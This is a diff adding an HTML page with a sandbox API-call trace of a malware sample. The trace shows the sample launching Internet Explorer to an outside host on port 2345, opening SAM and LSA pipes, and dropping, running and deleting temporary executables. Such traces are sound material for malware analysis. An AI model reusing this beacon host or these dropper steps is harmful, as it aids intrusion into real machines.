@@ -1,0 +1,189 @@
+<html>
+<head>
+<style>
+   pre{
+      font-size: 15px;
+    }
+</style>
+</head>
+<body>
+<pre>4cdf7b893431aba05bc17eb5a3da0ca909f3bba69e192a63f2acb7c4f7c6ad6c_3188.trace.hooklog Bahavior Analysis</pre>
+<pre><b># 23761000   LoadLibrary</b>
+    lpFileName=ntdll.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 23766000   LoadLibrary</b>
+    lpFileName=ntdll.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 23767000   LoadLibrary</b>
+    lpFileName=ntdll.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 23772000   CreateFile</b>
+    hName=C:\Program
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=FAILURE
+</pre>
+<pre><b># 23774000   CreateFile</b>
+    hName=C:\Program Files\Internet
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=FAILURE
+</pre>
+<pre><b># 23959000   LoadLibrary</b>
+    lpFileName=VERSION.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 23974000   CreateFile</b>
+    hName=C:\Program Files\Internet Explorer\IEXPLORE.EXE
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=SUCCESS
+</pre>
+<pre><b># 23984000   CreateFile</b>
+    hName=C:\Program Files\Internet Explorer\IEXPLORE.EXE
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=SUCCESS
+</pre>
+<pre><b># 24171000   RegQueryValue</b>
+    hKey=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache
+    Return=0
+</pre>
+<pre><b># 24174000   LoadLibrary</b>
+    lpFileName=advapi32.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 23769000   CreateProcessInternal</b>
+    lpCommandLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+    Return=SUCCESS
+    dwProcessId=3200
+    dwThreadId=3204
+</pre>
+<pre><b># 23769000   CreateProcessInternal</b>
+    lpCommandLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+    Return=SUCCESS
+    dwProcessId=3200
+    dwThreadId=3204
+</pre>
+<pre><b># 23769000   WinExec</b>
+    lpCmdLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+    Return=SUCCESS
+</pre>
+<pre><b># 24199000   CreateFile</b>
+    hName=\\.\NtHook
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=FAILURE
+</pre>
+<pre><b># 24199000   CreateFile</b>
+    hName=\\.\NtHook
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=FAILURE
+</pre>
+<pre><b># 24279000   LoadLibrary</b>
+    lpFileName=C:\WINDOWS\system32\IMM32.DLL
+    Return=SUCCESS
+</pre>
+<pre><b># 24411000   LoadLibrary</b>
+    lpFileName=gdi32.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 24347000   LoadLibrary</b>
+    lpFileName=LPK.DLL
+    Return=SUCCESS
+</pre>
+<pre><b># 24200000   LoadLibrary</b>
+    lpFileName=SAMLIB.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 24443000   RegQueryValue</b>
+    hKey=HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\MaxRpcSize
+    Return=2
+</pre>
+<pre><b># 24454000   LoadLibrary</b>
+    lpFileName=rpcrt4.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 24470000   CreateFile</b>
+    hName=\\.\PIPE\samr
+    desiredAccess=GENERIC_READ GENERIC_WRITE 
+    creationDisposition=OPEN_EXISTING
+    Return=SUCCESS
+</pre>
+<pre><b># 24600000   CreateFile</b>
+    hName=\\.\PIPE\lsarpc
+    desiredAccess=GENERIC_READ GENERIC_WRITE 
+    creationDisposition=OPEN_EXISTING
+    Return=SUCCESS
+</pre>
+<pre><b># 24617000   CreateFile</b>
+    hName=\\.\PIPE\samr
+    desiredAccess=GENERIC_READ GENERIC_WRITE 
+    creationDisposition=OPEN_EXISTING
+    Return=SUCCESS
+</pre>
+<pre><b># 24934000   CreateFile</b>
+    hName=C:\Documents and Settings\All Users\Desktop\malware.exe
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=SUCCESS
+</pre>
+<pre><b># 24942000   CreateFile</b>
+    hName=C:\Temp\pjhbzurmke.exe
+    desiredAccess=GENERIC_WRITE 
+    creationDisposition=CREATE_ALWAYS
+    Return=SUCCESS
+</pre>
+<pre><b># 25109000   LoadLibrary</b>
+    lpFileName=advapi32.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 24954000   CreateProcessInternal</b>
+    lpCommandLine=C:\temp\CP.exe C:\Temp\pjhbzurmke.exe ups_run
+    Return=SUCCESS
+    dwProcessId=3216
+    dwThreadId=3220
+</pre>
+<pre><b># 24954000   CreateProcess</b>
+    lpCommandLine=C:\temp\CP.exe C:\Temp\pjhbzurmke.exe ups_run
+    Return=SUCCESS
+    dwProcessId=3216
+    dwThreadId=3220
+</pre>
+<pre><b># 27875000   DeleteFile</b>
+    fileName=C:\Temp\pjhbzurmke.exe
+    Return=SUCCESS
+</pre>
+<pre><b># 28299000   CreateFile</b>
+    hName=C:\Documents and Settings\All Users\Desktop\malware.exe
+    desiredAccess=GENERIC_READ 
+    creationDisposition=OPEN_EXISTING
+    Return=SUCCESS
+</pre>
+<pre><b># 28333000   CreateFile</b>
+    hName=C:\Temp\i_pjhbzurmke.exe
+    desiredAccess=GENERIC_WRITE 
+    creationDisposition=CREATE_ALWAYS
+    Return=SUCCESS
+</pre>
+<pre><b># 28703000   LoadLibrary</b>
+    lpFileName=advapi32.dll
+    Return=SUCCESS
+</pre>
+<pre><b># 28348000   CreateProcessInternal</b>
+    lpCommandLine=C:\temp\CP.exe C:\Temp\i_pjhbzurmke.exe ups_ins
+    Return=SUCCESS
+    dwProcessId=2044
+    dwThreadId=192
+</pre>
+<pre><b># 28348000   CreateProcess</b>
+    lpCommandLine=C:\temp\CP.exe C:\Temp\i_pjhbzurmke.exe ups_ins
+    Return=SUCCESS
+    dwProcessId=2044
+    dwThreadId=192
+</pre>
+</body>
